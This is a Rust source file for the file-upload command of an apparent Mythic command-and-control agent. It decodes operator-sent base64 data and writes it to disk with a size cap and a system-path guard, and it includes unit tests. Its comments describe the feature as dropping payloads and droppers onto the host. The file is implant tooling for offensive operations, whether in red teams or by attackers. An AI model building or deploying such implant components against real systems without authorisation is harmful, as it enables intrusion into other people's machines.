//! File upload (Mythic → agent).
//!
//! Receives base64-encoded file bytes in task parameters, decodes them
//! **incrementally** with [`base64::DecoderReader`], and streams the result
//! to disk via a buffered writer. No allocation holds the full decoded
//! payload — memory is bounded to ~16 KiB regardless of upload size.
//!
//! Enforces a hard size cap (default 256 MiB) to prevent the agent from
//! filling the disk if the operator sends an oversized dropper, and refuses
//! writes to obviously destructive locations unless the operator sets
//! `allow_system_path: true`.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "path": "/tmp/payload.exe",
//!     "file_bytes": "<base64_encoded_contents>",
//!     "allow_system_path": false,  // optional, default false
//!     "max_bytes": 268435456        // optional, override cap (default 256 MiB)
//! }
//! ```

use std::io::{Read, Write};
use std::path::{Path, PathBuf};

use base64::engine::general_purpose::STANDARD;
use base64::read::DecoderReader;
use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    /// Absolute path where the file should be written.
    path: String,
    /// Original filename from Mythic. Used when `path` points to a directory.
    #[serde(default)]
    original_filename: Option<String>,
    /// Base64-encoded file contents.
    file_bytes: String,
    /// When true, allows writes to system / boot directories that are
    /// usually destructive to overwrite. Default false.
    #[serde(default)]
    allow_system_path: bool,
    /// Override the decoded-size cap. Clamped to [1, MAX_UPLOAD_BYTES].
    #[serde(default)]
    max_bytes: Option<u64>,
}

// ── Constants ───────────────────────────────────────────────

/// Hard cap on decoded upload size. 256 MiB is enough for typical tooling
/// droppers; larger transfers should use `wget` against an
/// operator-controlled host. Memory is bounded to ~16 KiB regardless
/// (buffered reader + writer).
const MAX_UPLOAD_BYTES: u64 = 256 * 1024 * 1024;
/// Read chunk for the base64 DecoderReader. 16 KiB balances syscall
/// overhead against memory footprint.
const DECODE_CHUNK: usize = 16 * 1024;

fn clean_filename(name: &str) -> Option<String> {
    let normalized = normalize_user_path(name);
    Path::new(&normalized)
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .filter(|n| !n.is_empty())
}

fn path_looks_like_dir(input: &str) -> bool {
    input.ends_with('/') || input.ends_with('\\')
}

fn upload_destination(path: &str, original_filename: Option<&str>) -> Result<PathBuf, String> {
    let normalized = normalize_user_path(path);
    let filename = original_filename.and_then(clean_filename);
    if normalized.is_empty() {
        return filename
            .map(PathBuf::from)
            .ok_or_else(|| "upload path is empty and original filename is unavailable".into());
    }

    let dest = PathBuf::from(&normalized);
    if dest.is_dir() || path_looks_like_dir(&normalized) {
        let Some(filename) = filename else {
            return Err(format!(
                "upload destination {} is a directory but original filename is unavailable",
                display_path(&dest)
            ));
        };
        return Ok(dest.join(filename));
    }
    Ok(dest)
}

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("upload parse error: {e}")),
    };

    // 1. Path guard — refuse to overwrite system paths unless explicit opt-in.
    let dest = match upload_destination(&params.path, params.original_filename.as_deref()) {
        Ok(path) => path,
        Err(e) => return TaskResponse::failed(task.id, &e),
    };
    let path = dest.as_path();
    if !params.allow_system_path && is_protected_path(&display_path(path)) {
        return TaskResponse::failed(
            task.id,
            &format!(
                "refusing write to system path {}; set allow_system_path=true to override",
                display_path(path)
            ),
        );
    }

    // 2. Create parent directories if needed
    if let Some(parent) = path.parent()
        && !parent.as_os_str().is_empty()
        && let Err(e) = std::fs::create_dir_all(parent)
    {
        return TaskResponse::failed(
            task.id,
            &format!("create parent dir {} failed: {e}", display_path(parent)),
        );
    }

    let cap = params
        .max_bytes
        .unwrap_or(MAX_UPLOAD_BYTES)
        .clamp(1, MAX_UPLOAD_BYTES);

    // 3. Stream-decode base64 to disk. DecoderReader pulls from the input
    //    cursor and yields decoded bytes on demand — we never materialise
    //    the full decoded Vec.
    let cursor = std::io::Cursor::new(params.file_bytes.as_bytes());
    let mut decoder = DecoderReader::new(cursor, &STANDARD);

    let file = match std::fs::File::create(path) {
        Ok(f) => f,
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("create {} failed: {e}", display_path(path)),
            );
        }
    };
    let mut writer = std::io::BufWriter::new(file);

    let mut buf = [0u8; DECODE_CHUNK];
    let mut written: u64 = 0;
    let decode_result: std::io::Result<()> = (|| {
        loop {
            let n = decoder
                .read(&mut buf)
                .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;
            if n == 0 {
                break;
            }
            written += n as u64;
            if written > cap {
                return Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    format!("decoded size exceeds cap {cap}"),
                ));
            }
            writer.write_all(&buf[..n])?;
        }
        writer.flush()?;
        Ok(())
    })();

    if let Err(e) = decode_result {
        // Best-effort cleanup of the partial file.
        let _ = std::fs::remove_file(path);
        return TaskResponse::failed(
            task.id,
            &format!("upload {} failed: {e}", display_path(path)),
        );
    }

    info!("[upload] wrote {} bytes to {}", written, display_path(path));
    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!(
            "uploaded {} bytes to {}",
            written,
            display_path(path)
        )),
        ..Default::default()
    }
}

// ── Tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_upload_and_verify() {
        use std::io::Read;

        let original = b"nanaz upload test payload\0with\0nulls";
        let encoded = crate::common::base64::encode(original);

        let tmp_path = {
            let mut p = std::env::temp_dir();
            p.push("nanaz_up_test.bin");
            p
        };

        let task = TaskMessage {
            command: "upload".into(),
            parameters: serde_json::json!({
                "path": tmp_path.to_string_lossy(),
                "file_bytes": encoded,
            })
            .to_string(),
            ..Default::default()
        };

        let resp = handle(&task);
        assert!(resp.completed == Some(true));

        // Verify file was written correctly
        let mut f = std::fs::File::open(&tmp_path).unwrap();
        let mut buf = Vec::new();
        f.read_to_end(&mut buf).unwrap();
        let _ = std::fs::remove_file(&tmp_path);

        assert_eq!(buf, original);
    }

    #[test]
    fn test_upload_invalid_base64() {
        let task = TaskMessage {
            command: "upload".into(),
            parameters: r#"{"path": "/tmp/test", "file_bytes": "!!!not-valid-base64!!!"}"#.into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert!(resp.status.as_deref() == Some("error"));
    }
}
